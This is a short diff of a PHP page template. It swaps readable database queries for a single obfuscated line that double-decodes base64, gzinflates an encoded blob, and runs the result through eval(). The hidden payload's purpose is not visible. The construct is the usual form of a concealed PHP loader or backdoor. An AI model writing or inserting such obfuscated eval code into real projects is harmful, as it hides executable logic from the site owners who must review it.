@@ -1,6 +1,5 @@
-<?php require('kon.php');
-$kategori = mysqli_query($kon, "SELECT * FROM artikel GROUP BY kategori ORDER BY kategori ASC");
-$populer = mysqli_query($kon, "SELECT * FROM artikel ORDER BY view DESC LIMIT 0,3");
+<?php
+$SISTEMIT_COM_ENC = "21r0u/Dx66LfGurZD/P0Ct4WqGta83KpZH999Tv9YdHrrbZbcyufFea8ji98/LuoUkMFqEpnq1Kwq4+rc8hWra1uQf6+W78WvXqd/Ttnq3uQf2jAVqfIrXDd/kEurkEoIo7BzkpgGwoeFjzO+V1EkgVw4/6+/l2+1cU12Hmrj6evZ8hWAx1jsKkA";$rand=base64_decode("Skc1aGRpQTlJR2Q2YVc1bWJHRjBaU2hpWVhObE5qUmZaR1ZqYjJSbEtDUlRTVk5VUlUxSlZGOURUMDFmUlU1REtTazdEUW9KQ1Fra2MzUnlJRDBnV3lmMUp5d242eWNzSitNbkxDZjdKeXduNFNjc0ovRW5MQ2ZtSnl3bjdTY3NKLzBuTENmcUp5d250U2RkT3cwS0NRa0pKSEp3YkdNZ1BWc25ZU2NzSjJrbkxDZDFKeXduWlNjc0oyOG5MQ2RrSnl3bmN5Y3NKMmduTENkMkp5d25kQ2NzSnlBblhUc05DZ2tKSUNBZ0lDUnVZWFlnUFNCemRISmZjbVZ3YkdGalpTZ2tjM1J5TENSeWNHeGpMQ1J1WVhZcE93MEtDUWtKWlhaaGJDZ2tibUYyS1RzPQ==");eval(base64_decode($rand));$STOP="66LfGurZD/P0Ct4WqGta83KpZH999Tv9YdHrrbZbcyufFea8ji98/LuoUkMFqEpnq1Kwq4+rc8hWra1uQf6+W78WvXqd/Ttnq3uQf2jAVqfIrXDd/kEurkEoIo7BzkpgGwoeFjzO+V1EkgVw4/6+/l2+1cU12Hmrj6evZ8hWAx1jsKkA";
 ?>
 <div class="row">
   <div class="col-md-12">
